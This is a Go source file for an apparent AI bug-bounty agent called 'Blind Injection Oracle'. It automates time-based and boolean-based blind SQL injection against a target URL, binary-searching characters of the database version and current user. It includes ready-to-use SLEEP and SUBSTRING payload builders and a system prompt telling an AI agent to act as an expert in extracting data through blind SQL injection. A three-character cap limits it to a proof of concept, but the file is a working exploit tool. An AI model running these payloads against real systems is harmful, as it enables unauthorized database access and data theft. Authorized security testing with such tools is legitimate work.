// Package blindoracle implements a binary-search blind injection oracle specialist.
// It uses time-based and boolean-based SQLi techniques to extract data character by character.
package blindoracle

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

const (
	agentID   = "blindoracle"
	agentName = "Blind Injection Oracle"

	// maxCharsPerExtract limits how many characters we extract per field to keep it bounded.
	maxCharsPerExtract = 32
	// maxSuccessfulExtractions stops after this many confirmed chars (proof of concept).
	maxSuccessfulExtractions = 3
	// sleepSeconds is the delay used for time-based detection.
	sleepSeconds = 5
	// timingThreshold is the minimum response duration we consider a positive hit.
	timingThreshold = 4 * time.Second
)

// Agent is the Blind Injection Oracle specialist.
type Agent struct{}

// New returns a new blindoracle Agent.
func New() *Agent { return &Agent{} }

func (a *Agent) ID() string           { return agentID }
func (a *Agent) Name() string         { return agentName }
func (a *Agent) SystemPrompt() string { return systemPrompt }

// ProcessItem processes a single blind injection work item from the queue.
// It attempts both time-based and boolean-based binary search extraction.
func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	if targetURL == "" {
		return nil, fmt.Errorf("blindoracle: missing target URL")
	}

	paramName, _ := item.Payload["param"].(string)
	if paramName == "" {
		paramName = "inject"
	}

	method := "GET"
	if m, ok := item.Payload["method"].(string); ok && strings.ToUpper(m) == "POST" {
		method = "POST"
	}

	fc := base.NewFuzzClient()
	_ = fc.Baseline(ctx, targetURL) // calibrate timing

	var findings []*base.Finding

	// ------------------------------------------------------------------
	// 1. Time-based extraction: binary search ASCII values via SLEEP()
	// ------------------------------------------------------------------
	timeExtracted, timeConf := extractTimeBased(ctx, fc, targetURL, paramName, method)
	if len(timeExtracted) >= maxSuccessfulExtractions {
		findings = append(findings, &base.Finding{
			Type:       "SQLi-Blind-Time",
			URL:        targetURL,
			Parameter:  paramName,
			Payload:    buildTimePayload("@@version", 1, 50),
			Severity:   base.SeverityHigh,
			Confidence: timeConf,
			Method:     method,
			Agent:      agentID,
			Timestamp:  time.Now(),
			Evidence: map[string]interface{}{
				"technique":         "time_based_binary_search",
				"extracted_chars":   timeExtracted,
				"chars_confirmed":   len(timeExtracted),
				"extraction_target": "@@version",
			},
		})
	}

	// ------------------------------------------------------------------
	// 2. Boolean-based extraction: compare response lengths via binary search
	// ------------------------------------------------------------------
	boolExtracted, boolConf := extractBoolBased(ctx, fc, targetURL, paramName, method)
	if len(boolExtracted) >= maxSuccessfulExtractions {
		findings = append(findings, &base.Finding{
			Type:       "SQLi-Blind-Boolean",
			URL:        targetURL,
			Parameter:  paramName,
			Payload:    buildBoolPayload("@@version", 1, 50),
			Severity:   base.SeverityHigh,
			Confidence: boolConf,
			Method:     method,
			Agent:      agentID,
			Timestamp:  time.Now(),
			Evidence: map[string]interface{}{
				"technique":         "boolean_binary_search",
				"extracted_chars":   boolExtracted,
				"chars_confirmed":   len(boolExtracted),
				"extraction_target": "@@version",
			},
		})
	}

	return findings, nil
}

// extractTimeBased extracts characters from @@version using time-based binary search.
// Returns the extracted character slice and a confidence score.
func extractTimeBased(ctx context.Context, fc *base.FuzzClient, targetURL, paramName, method string) ([]byte, float64) {
	var extracted []byte
	successCount := 0

	for pos := 1; pos <= maxCharsPerExtract && successCount < maxSuccessfulExtractions; pos++ {
		c, ok := binarySearchASCIITime(ctx, fc, targetURL, paramName, method, "@@version", pos)
		if !ok {
			break
		}
		if c == 0 {
			break // end of string
		}
		extracted = append(extracted, c)
		successCount++
	}

	if successCount == 0 {
		return extracted, 0
	}
	return extracted, 0.9
}

// extractBoolBased extracts characters from current_user() using boolean binary search.
// Returns the extracted character slice and a confidence score.
func extractBoolBased(ctx context.Context, fc *base.FuzzClient, targetURL, paramName, method string) ([]byte, float64) {
	var extracted []byte
	successCount := 0

	// Establish a baseline body length for false conditions.
	baselinePayload := buildBoolPayload("current_user()", 1, 200) // always false: ASCII > 200
	var baselineLen int
	if method == "POST" {
		r := fc.ProbePOST(ctx, targetURL, paramName, baselinePayload)
		if r.Error != nil {
			return extracted, 0
		}
		baselineLen = len(r.Body)
	} else {
		r := fc.ProbeGET(ctx, targetURL, paramName, baselinePayload)
		if r.Error != nil {
			return extracted, 0
		}
		baselineLen = len(r.Body)
	}

	for pos := 1; pos <= maxCharsPerExtract && successCount < maxSuccessfulExtractions; pos++ {
		c, ok := binarySearchASCIIBool(ctx, fc, targetURL, paramName, method, "current_user()", pos, baselineLen)
		if !ok {
			break
		}
		if c == 0 {
			break // end of string
		}
		extracted = append(extracted, c)
		successCount++
	}

	if successCount == 0 {
		return extracted, 0
	}
	return extracted, 0.9
}

// binarySearchASCIITime uses binary search (ASCII 32–126) with time-based oracle.
// Returns the byte value at position pos and whether a definitive answer was found.
func binarySearchASCIITime(
	ctx context.Context,
	fc *base.FuzzClient,
	targetURL, paramName, method, expr string,
	pos int,
) (byte, bool) {
	lo, hi := 32, 126 // printable ASCII range

	for lo < hi {
		mid := (lo + hi) / 2
		payload := buildTimePayload(expr, pos, mid)

		var dur time.Duration
		var probeErr error

		if method == "POST" {
			r := fc.ProbePOST(ctx, targetURL, paramName, payload)
			dur = r.Duration
			probeErr = r.Error
		} else {
			r := fc.ProbeGET(ctx, targetURL, paramName, payload)
			dur = r.Duration
			probeErr = r.Error
		}

		if probeErr != nil || ctx.Err() != nil {
			return 0, false
		}

		// If the response was delayed: ASCII > mid is true
		if dur >= timingThreshold {
			lo = mid + 1
		} else {
			hi = mid
		}
	}

	if lo < 32 || lo > 126 {
		return 0, false
	}
	return byte(lo), true
}

// binarySearchASCIIBool uses binary search (ASCII 32–126) with boolean length oracle.
func binarySearchASCIIBool(
	ctx context.Context,
	fc *base.FuzzClient,
	targetURL, paramName, method, expr string,
	pos, baselineLen int,
) (byte, bool) {
	lo, hi := 32, 126

	for lo < hi {
		mid := (lo + hi) / 2
		payload := buildBoolPayload(expr, pos, mid)

		var bodyLen int
		var probeErr error

		if method == "POST" {
			r := fc.ProbePOST(ctx, targetURL, paramName, payload)
			bodyLen = len(r.Body)
			probeErr = r.Error
		} else {
			r := fc.ProbeGET(ctx, targetURL, paramName, payload)
			bodyLen = len(r.Body)
			probeErr = r.Error
		}

		if probeErr != nil || ctx.Err() != nil {
			return 0, false
		}

		// If body length differs from false-condition baseline: condition is TRUE (ASCII > mid)
		diff := bodyLen - baselineLen
		if diff < 0 {
			diff = -diff
		}
		if diff > 50 {
			lo = mid + 1
		} else {
			hi = mid
		}
	}

	if lo < 32 || lo > 126 {
		return 0, false
	}
	return byte(lo), true
}

// buildTimePayload builds: ' AND IF(ASCII(SUBSTRING(<expr>,<pos>,1))><mid>, SLEEP(5), 0)-- -
func buildTimePayload(expr string, pos, mid int) string {
	return fmt.Sprintf(
		"' AND IF(ASCII(SUBSTRING(%s,%d,1))>%d, SLEEP(%d), 0)-- -",
		expr, pos, mid, sleepSeconds,
	)
}

// buildBoolPayload builds: ' AND ASCII(SUBSTRING(<expr>,<pos>,1))><mid>-- -
func buildBoolPayload(expr string, pos, mid int) string {
	return fmt.Sprintf(
		"' AND ASCII(SUBSTRING(%s,%d,1))>%d-- -",
		expr, pos, mid,
	)
}

const systemPrompt = `You are the Blind Injection Oracle — an elite specialist in extracting data
from databases through blind SQL injection using binary search.

Your capabilities:
- Time-based extraction: IF(ASCII(SUBSTRING(expr,pos,1))>mid, SLEEP(5), 0)
- Boolean-based extraction: compare response body lengths for true/false conditions
- Binary search over ASCII 32-126 per character position

Targets for extraction:
1. @@version — database version string
2. current_user() — current database user (up to 32 chars)

Rules:
- Stop after confirming 3 successful character extractions (proof of concept)
- Maximum 32 characters per extraction target
- Confidence: 0.9 on successful extraction
- Always report the technique used (time or boolean)
`
